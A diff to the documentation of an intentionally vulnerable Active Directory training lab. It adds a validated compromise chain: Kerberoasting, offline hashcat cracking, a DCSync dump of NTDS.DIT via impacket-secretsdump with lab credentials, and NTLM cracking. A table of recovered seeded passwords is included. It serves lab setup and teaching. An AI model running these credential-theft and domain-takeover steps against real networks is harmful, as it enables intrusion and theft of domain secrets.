@@ -169,3 +169,45 @@ nxc smb 10.0.2.11 10.0.2.12 -u fcastle -p 'Password1' -d MARVEL.local
 # V6 — the hackme share is visible:
 nxc smb 10.0.2.10 -u fcastle -p 'Password1' -d MARVEL.local --shares | grep -i hackme
 ```
+
+---
+
+## Validated end-to-end — full compromise chain (2026-11-25)
+
+The intended path was run against the deployed lab and works out of the box. This is the chain
+the weaknesses above are meant to produce, start to finish:
+
+```text
+1. Kerberoast (V1):   GetUserSPNs -request  ->  $krb5tgs$23$ (RC4) ticket for SQL_Service
+2. Crack offline:     hashcat -m 13100      ->  SQL_Service : MYpassword123#
+                      (same value is also literally in the account's AD Description)
+3. Privilege (V1b):   SQL_Service is a Domain Admin  ->  replication (DCSync) rights
+4. DCSync the DIT:    impacket-secretsdump MARVEL.local/SQL_Service:'MYpassword123#'@10.0.2.10
+                      -> uses the DRSUAPI method to pull every NTDS.DIT secret
+5. Crack NTLM (V2):   hashcat -m 1000 ntds_hashes.txt rockyou.txt
+```
+
+**Step 4 succeeding is itself the proof the V1b fix is live** — `secretsdump` only reaches the
+`[*] Using the DRSUAPI method to get NTDS.DIT secrets` stage because `SQL_Service` now holds
+Domain Admin / replication rights. Before the fix it was a standard user and DCSync was refused.
+
+**Step 5 result** — rockyou recovered the four seeded domain users straight from the NTDS dump:
+
+| Account | Recovered password | Note |
+|---|---|---|
+| `tstark` | `P@$$w0rd` | Domain Admin — full domain owned |
+| `SQL_Service` | `MYpassword123#` | Domain Admin (the roasted account) |
+| `fcastle` | `Password1` | local admin on both workstations |
+| `pparker` | `Password2` | standard user |
+
+The strong-random accounts (`azureadmin`, `krbtgt`, the machine accounts) correctly resist
+rockyou — only the deliberately-weak seeded passwords fall, exactly as designed.
+
+> **Why the raw dumps aren't pasted here.** The full `secretsdump` output contains *real*
+> operational secrets for the running deployment — the `krbtgt` hash (golden-ticket material),
+> the `azureadmin` NT hash (pass-the-hash to the live VMs), machine-account hashes, LSA secrets
+> and DPAPI keys. Those must **never** be committed to the repo (see
+> [security-model.md](security-model.md) and `make audit`). Keep any raw loot in a local,
+> git-ignored `marvel-loot/` directory on the attacker box — not in version control. The seeded
+> user passwords shown above are already public by design, so they're safe to document.
+
